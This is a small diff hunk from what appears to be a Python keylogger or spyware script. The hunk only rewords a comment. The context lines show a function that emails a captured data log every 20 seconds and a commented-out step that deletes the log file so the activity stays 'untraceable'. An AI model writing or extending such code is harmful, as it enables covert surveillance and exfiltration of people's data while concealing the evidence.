@@ -117,7 +117,7 @@ def send_log_periodically():
     threading.Timer(20.0, send_log_periodically).start()
     email_data_log()
     print("Sent Log")
-    # if you want to remove temporary storage file after file is sent to be untraceable, uncomment the line below
+    # if you want to remove temporary storage file after file is sent, in order to be untraceable, uncomment the line below
     # os.remove(path_log)
 
 
